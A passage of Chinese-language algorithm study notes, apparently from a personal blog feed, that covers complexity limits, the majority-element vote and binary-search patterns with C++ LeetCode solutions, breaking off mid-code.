<p>使……最大值尽可能小</p>
</li>
<li class="lvl-2">
<p>前缀和</p>
</li>
<li class="lvl-3">
<p>子数组</p>
</li>
<li class="lvl-2">
<p>动态规划</p>
</li>
<li class="lvl-3">
<p>将数组分割为割为<em>m</em>段，求……</p>
</li>
<li class="lvl-3">
</li>
</ul>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">滑动窗口
<ul class="lvl-2">
<li class="lvl-6">长度固定的子数组</li>
</ul>
</li>
</ul>
<h1>数值范围</h1>
<p>int：4字节，32位，最大值:$2^{31}-1=2147483647$，最小值$-2147483648$。</p>
<p>$10<sup>5$的数据范围不能用$O(n</sup>2)$解法<br>
$10^9$的时间复杂度不行</p>
<table>
<thead>
<tr>
<th>数据范围</th>
<th>复杂度</th>
</tr>
</thead>
<tbody>
<tr>
<td>$10^5$</td>
<td>$nlog(n)$</td>
</tr>
</tbody>
</table>
<h2 id="区间">区间</h2>
<p>对于两个区间$[S_1,e_1)$和$[S_2,e_2)$，如果两者没有交集，则此时应当满足$s_1 \ge e_2$或者$s_2 \ge  e_1$，即如果$s_1 &lt;e_2 且 s_2&lt;e_1$，两者会产生交集。</p>
<p>num/mid上取整<br>
(num-1)/mid+1    (num+mid-1)/mid</p>
<h1>K小问题</h1>
<p>k 小问题有三种解法：按位确定答案（多用于字符串和二进制数），用堆维护当前最小答案（用于 kkk 比较小的情况），二分（用于 kkk 比较大的情况）。</p>
<h1>字符串</h1>
<h2 id="出现的大小写字母集合">出现的大小写字母集合</h2>
<p>因此可以利用二进制位来进行标记，lower标记字符中出现过小写英文字母，upper标记字符中出现过大写英文字母。如果满足lower=upper，则认为字符串中所有的字符都满足大小写形式同时出现。</p>
<p><a href="https://leetcode.cn/problems/longest-nice-substring/">1763. 最长的美好子字符串</a></p>
<p>字符是否出现<br>
<a href="https://leetcode.cn/problems/count-the-number-of-consistent-strings/description/">1684. 统计一致字符串的数目 - 力扣（LeetCode）</a></p>
<h1>数组</h1>
<p>「长度固定的子数组」就要想到滑动窗口对角线上是否放置元素</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>record.count(x-y)</p>
</li>
<li class="lvl-2">
<p>record.count(x+y)</p>
</li>
</ul>
<h2 id="出现超过一半的数字">出现超过一半的数字</h2>
<p><a href="https://blog.csdn.net/chris__x/article/details/107781237">找出数组中出现次数超过数组长度一半的数字</a></p>
<h4 id="169-多数元素"><a href="https://leetcode.cn/problems/majority-element/">169. 多数元素</a></h4>
<ol>
<li class="lvl-3">
<p>哈希表记录出现次数</p>
</li>
<li class="lvl-3">
<p>排序后取中位数</p>
</li>
<li class="lvl-3">
<p>抵消法</p>
</li>
<li class="lvl-3">
<p>快排取中位数</p>
</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> cnt=<span class="number">0</span>,pre=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt==<span class="number">0</span>)&#123;</span><br><span class="line">                pre=num;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num==pre)&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cnt--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>动态规划</h1>
<p>动态规划的题目分为两大类，一种是求最优解类，典型问题是背包问题，另一种就是计数类，比如这里的统计方案数的问题，它们都存在一定的递推性质。「将数组分割为割为m  段，求……」是动态规划题目常见的问法。<a href="https://leetcode.cn/problems/split-array-largest-sum/">410. 分割数组的最大值</a></p>
<h1>二分查找</h1>
<blockquote>
<p>适合求解具有<mark>单调最优</mark>性质的题目</p>
</blockquote>
<p>「使……最大值尽可能小」是二分搜索题目常见的问法。<a href="https://leetcode.cn/problems/split-array-largest-sum/">410. 分割数组的最大值</a></p>
<h1>预处理回文数</h1>
<blockquote>
<p>枚举回文数左半部分</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; pal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> init=[]&#123;</span><br><span class="line">    <span class="comment">// 严格按顺序从小到大生成所有回文数（不用字符串转换）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> base=<span class="number">1</span>;base&lt;=<span class="number">10000</span>;base*=<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="comment">//生成奇数长度回文数</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i=base;i&lt;base*<span class="number">10</span>;i++)&#123;</span><br><span class="line">             <span class="type">int</span> x=i;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> t=i/<span class="number">10</span>;t;t/=<span class="number">10</span>)&#123;</span><br><span class="line">                 x=x*<span class="number">10</span>+t%<span class="number">10</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             pal.<span class="built_in">push_back</span>(x);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//生成偶数长度回文数</span></span><br><span class="line">         <span class="keyword">if</span>(base&lt;=<span class="number">1000</span>)&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> i=base;i&lt;base*<span class="number">10</span>;i++)&#123;</span><br><span class="line">                 <span class="type">int</span> x=i;</span><br><span class="line">                 <span class="keyword">for</span>(<span class="type">int</span> t=i;t;t/=<span class="number">10</span>)&#123;</span><br><span class="line">                     x=x*<span class="number">10</span>+t%<span class="number">10</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 pal.<span class="built_in">push_back</span>(x);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pal.<span class="built_in">push_back</span>(<span class="number">1&#x27;000&#x27;000&#x27;001</span>); <span class="comment">// 哨兵，防止下面代码中的 i 下标越界</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>二分查找</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<h1>二分查找</h1>
<p>查区间[left,right]是否存在某个数字，不存在返回-1</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>left=0, right=n-1</p>
</li>
<li class="lvl-2">
<p>while(left&lt;=right)</p>
</li>
<li class="lvl-2">
<p>在循环中判断相等情况</p>
</li>
</ul>
<p>不同写法：<a href="https://leetcode.cn/problems/h-index-ii/solutions/2504326/tu-jie-yi-tu-zhang-wo-er-fen-da-an-si-ch-d15k/">275. H 指数 II - 力扣（LeetCode）</a></p>
<ul class="lvl-0">
<li class="lvl-3">
<p>在排序数组中寻找是否存在一个目标值</p>
</li>
<li class="lvl-3">
<p>如果不存在数组中，返回按顺序插入的位置（寻找&gt;=target的第一个位置）</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202304170958535.png" alt="image-20230417095803501"></p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//target 大于数组中的所有数</span></span><br><span class="line"><span class="type">int</span> left=<span class="number">0</span>,right=nums.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">    <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(nums[mid]&lt;target)&#123;</span><br><span class="line">        left=mid<span class="number">+1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        rigth=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="69-x-的平方根"><a href="https://leetcode.cn/problems/sqrtx/">69. x 的平方根 </a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=x;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(mid<span class="number">+1</span>&lt;=x/(mid<span class="number">+1</span>))&#123;</span><br><span class="line">                left=mid<span class="number">+1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                right=mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//左侧可能不动，右侧必须缩小，这种可能跳不出left==right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=x;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="type">long</span> mid=((<span class="type">long</span>)right+left<span class="number">+1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(mid&lt;=x/mid)</span><br><span class="line">                left=mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//记录答案，使用等号</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = x, ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">long</span> <span class="type">long</span>)mid * mid &lt;= x) &#123;</span><br><span class="line">                ans = mid;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="441-排列硬币-力扣（Leetcode）"><a href="https://leetcode.cn/problems/arranging-coins/description/">441. 排列硬币 - 力扣（Leetcode）</a></h4>
<h5 id="区间mid取值靠左">区间mid取值靠左</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">arrangeCoins</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">1</span>,right=n;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="type">long</span> sum=<span class="number">1l</span>*(<span class="number">1</span>+mid)*mid/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(sum&lt;=n)</span><br><span class="line">                left=mid<span class="number">+1</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                right=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="区间mid取值靠右">区间mid取值靠右</h5>
<blockquote>
<p>有个小点需要注意的是<code>mid = (left + right + 1) // 2</code><br>
先加1再除以2是为了让中间值靠右，因为在后序对右边的值处理是 right = mid - 1<br>
当区间只剩下两个元素的时候，判断元素大小后采用left = mid 和 right = mid - 1 这种处理方式，如果 mid 使用默认下取整的方式，在数值上 left = mid，而它对应的其中一个区间是 [mid…right]，在这种情况下，下一轮搜索区间还是 [left…right]，搜索区间没有减少，会进入死循环。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">arrangeCoins</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">1</span>, right = n;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (right - left + <span class="number">1</span>) / <span class="number">2</span> + left;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">long</span> <span class="type">long</span>) mid * (mid + <span class="number">1</span>) &lt;= (<span class="type">long</span> <span class="type">long</span>) <span class="number">2</span> * n) &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="35-搜索插入位置"><a href="https://leetcode.cn/problems/search-insert-position/">35. 搜索插入位置</a></h4>
<p>比较两种写法区别</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">searchInsert</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">                left=mid<span class="number">+1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">     <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">     <span class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">         left=mid<span class="number">+1</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">         right=mid<span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> left;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/20210429145355.png" alt="算法图示"></p>
<blockquote>
<p>如果查找到相应的值，返回mid，num[mid]即为要查找的值</p>
<p>否则，退出while时，low&gt;high，且num[low]&gt;key，num[high]&lt;key。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    二分查找（折半查找）</span></span><br><span class="line"><span class="comment">    返回下标值，从0开始</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Binary_search</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;num, <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> low = <span class="number">0</span>, high = num.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (num[mid] == key)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (num[mid] &gt; key)</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;low:&quot;</span> &lt;&lt; low &lt;&lt; <span class="string">&quot; high:&quot;</span> &lt;&lt; high &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; num = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">Binary_search</span>(num, <span class="number">5</span>) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/20210428151148.png" alt="image-20210428151108695"></p>
<h4 id="410-分割数组的最大值"><a href="https://leetcode.cn/problems/split-array-largest-sum/">410. 分割数组的最大值</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	有问题的写法</span></span><br><span class="line"><span class="comment">	13   14  15</span></span><br><span class="line"><span class="comment">	14   14   15</span></span><br><span class="line"><span class="comment">	left=14符合解的条件，</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">    <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">    cout&lt;&lt;left&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;mid&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;right&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">checker</span>(nums,mid)&gt;=k)</span><br><span class="line">        left=mid;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        right=mid<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>采用&lt;=写法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">splitArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>(),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=sum;</span><br><span class="line">        <span class="comment">// cout&lt;&lt;left&lt;&lt;&quot; &quot;&lt;&lt;right&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">// cout&lt;&lt;mid&lt;&lt;endl;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">check</span>(nums,k,mid))&#123;</span><br><span class="line">                right=mid<span class="number">-1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                left=mid<span class="number">+1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;nums,<span class="type">int</span> k,<span class="type">int</span> limit)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>,part=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;limit) </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">            <span class="keyword">if</span>(sum+nums[i]&lt;=limit)&#123;</span><br><span class="line">                sum+=nums[i];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                sum=nums[i];</span><br><span class="line">                part++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// cout&lt;&lt;limit&lt;&lt;&quot; &quot;&lt;&lt;part&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">return</span> part&lt;=k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>采用&lt;写法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> x, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum + nums[i] &gt; x) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                sum = nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum += nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt &lt;= m;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">splitArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            right += nums[i];</span><br><span class="line">            <span class="keyword">if</span> (left &lt; nums[i]) &#123;</span><br><span class="line">                left = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">check</span>(nums, mid, m)) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/">34. 在排序数组中查找元素的第一个和最后一个位置</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">searchRange</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">        <span class="type">int</span> first = <span class="built_in">mylower</span>(nums, target), last = <span class="built_in">mylower</span>(nums, target<span class="number">+1</span>)<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (first == nums.<span class="built_in">size</span>() || nums[first] != target)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> &#123;first, last&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">mylower</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>, right = nums.<span class="built_in">size</span>(), mid;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &lt; target)</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">myupper</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>, right = nums.<span class="built_in">size</span>(), mid;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] &lt;= target)</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><a href="https://leetcode.cn/problems/search-in-rotated-sorted-array/">33. Search in Rotated Sorted Array</a></p>
<blockquote>
<p>寻找有序区间，判断targte是否位于有序区间内</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202309011150215.png" alt="image-20230901115021140"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = (<span class="type">int</span>)nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (!n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>] == target ? <span class="number">0</span> : <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt;= nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt;= target &amp;&amp; 